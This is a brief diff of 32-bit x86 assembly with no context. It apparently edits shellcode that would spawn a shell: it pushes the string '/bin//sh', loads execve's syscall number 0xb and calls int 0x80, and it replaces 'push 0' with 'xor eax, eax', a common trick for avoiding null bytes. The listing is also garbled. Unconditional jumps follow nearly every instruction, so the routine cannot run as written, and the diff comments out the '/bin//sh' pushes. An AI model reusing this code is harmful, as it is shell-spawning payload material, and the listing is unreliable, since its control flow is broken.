@@ -6,24 +6,25 @@ start:
 main:
 push   ebp
 mov    ebp, esp
-mov    ecx, edx
-add    ecx, 12
-jmp    ecx
+mov    esi, edx
+add    esi, 12
+jmp    esi
 add    edx, 12
 jmp    edx
-push   0
-jmp    ecx
-push   0x68732f2f
-jmp    ecx
-push   0x6e69622f
-jmp    ecx
+xor    eax, eax
+push   eax
+jmp    esi
+;push   0x68732f2f
+jmp    esi
+;push   0x6e69622f
+jmp    esi
 mov    esp, ebx
-push   0
+push   eax
 push   ebx
-jmp    ecx
+jmp    esi
 mov    esp, ecx
 mov    al, 0xb
-jmp    ecx
+jmp    esi
 int    0x80
 ret
 leave
